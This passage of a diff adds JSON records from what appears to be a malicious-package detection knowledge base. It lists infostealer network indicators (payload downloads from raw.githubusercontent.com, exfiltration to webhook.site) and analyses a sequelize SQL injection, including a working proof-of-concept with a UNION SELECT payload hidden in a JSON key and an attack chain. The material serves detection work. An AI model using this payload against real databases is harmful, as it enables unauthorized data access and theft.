+                    "Outbound HTTP/HTTPS requests to raw.githubusercontent.com for payload downloads",
+                    "Connections to webhook.site or similar data collection endpoints for exfiltration",
+                    "Downloads from repl.it or other code hosting services during installation or import"
+                  ],
+                  "how_to_detect": "Monitor for packages that initiate network connections to code hosting or data exfiltration endpoints during installation or import. Flag any package that downloads and executes remote code, accesses credential stores, or references known infostealer infrastructure. Use static analysis to detect suspicious import-time or setup.py logic, and dynamic analysis to observe unexpected network or filesystem activity during package installation or import. Correlate creation of unexpected executables and outbound connections to known malicious infrastructure."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205358_629657_snippet_1",
+              "source_package": "sequelize (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205358_629657/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.37217655777931213,
+              "code_similarity": 0.3336247503757477,
+              "behavior_similarity": 0.4107283651828766,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "console.log(await Project.findAll({\n  where: {meta: {\"a')) AS DECIMAL) = 1 UNION SELECT VERSION(); -- \": 1}},\n  attributes: ['name'],\n  raw: true,\n}));",
+                "code_behavior": "At runtime, the code passes attacker-supplied input as a JSON key in the query object to sequelize's findAll method, which fails to properly escape the key, resulting in direct injection of SQL syntax into the generated query, leading to arbitrary SQL execution in the database.",
+                "malice_analysis": {
+                  "why_suspicious": "This behavior is suspicious because user-controlled input is used as a key in a JSON object that is directly incorporated into a SQL query without proper sanitization or escaping, enabling attackers to inject and execute arbitrary SQL statements.",
+                  "violated_expectations": "ORMs are expected to safely escape and validate all user input, including object keys, to prevent SQL injection. In this case, sequelize fails to escape JSON path keys, violating the security guarantee that user input cannot alter the structure of generated SQL queries.",
+                  "similar_legitimate_use": "Legitimate use would involve dynamic querying on JSON fields, but only with keys that are strictly validated and sanitized to ensure they do not contain SQL syntax or special characters.",
+                  "key_indicators": [
+                    "User input used as a JSON key in ORM query objects",
+                    "Lack of escaping or sanitization for special SQL characters in object keys",
+                    "Presence of SQL syntax (e.g., UNION SELECT, comments) in JSON key names",
+                    "Generated SQL queries containing attacker-supplied key names"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "application code using sequelize's findAll method with unsanitized user input as a JSON key in the query object",
+                  "required_permissions": [
+                    "database access"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "sequelize",
+                  "package_manager": "npm",
+                  "package_versions": "<5.8.11 (MySQL/MariaDB), <3.35.1 (PostgreSQL), <5.15.1 (other fixes)",
+                  "why_malicious": "The affected versions of the sequelize package contain SQL injection vulnerabilities due to improper sanitization of JSON path keys in queries. This flaw allows attackers to inject arbitrary SQL code by supplying crafted input as JSON object keys, exposing applications to severe risks such as data exfiltration, unauthorized data manipulation, privilege escalation, and potential full database compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker crafts a JSON key containing a SQL injection payload and submits it as part of a query to the application.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "The application passes the malicious key to sequelize's query builder."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Sequelize fails to properly escape the JSON key, resulting in the injection of attacker-controlled SQL into the generated query.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "The database executes the injected SQL, allowing the attacker to exfiltrate or manipulate data, or potentially escalate privileges."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Use of user-controlled input as object keys in ORM query objects for JSON fields",
+                    "Generated SQL queries containing unexpected SQL syntax (e.g., UNION SELECT, semicolons, comments) in place of JSON key names",
+                    "Queries on JSON fields with non-standard or suspicious key names that match SQL injection patterns"
+                  ],
+                  "file_indicators": [
+                    "Application code using sequelize's findAll, findOne, update, or destroy methods with dynamic JSON keys derived from user input",
+                    "Presence of unsanitized or unvalidated user input in query object keys passed to ORM methods"
+                  ],
+                  "network_indicators": [
+                    "Unusual or unauthorized SQL queries observed in database logs, such as those containing UNION SELECT, VERSION(), or SQL comment sequences",
+                    "Database errors related to malformed queries with injected syntax, especially referencing unexpected JSON key names"
+                  ],
+                  "how_to_detect": "Perform static analysis of application code to identify cases where user input is used as a key in ORM query objects, particularly for JSON fields. Monitor generated SQL queries for the presence of SQL injection patterns or unexpected syntax in key positions. Review database logs for errors or queries containing suspicious key names or SQL injection payloads. Implement runtime monitoring to flag dynamic object keys in queries that are not strictly validated or sanitized."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
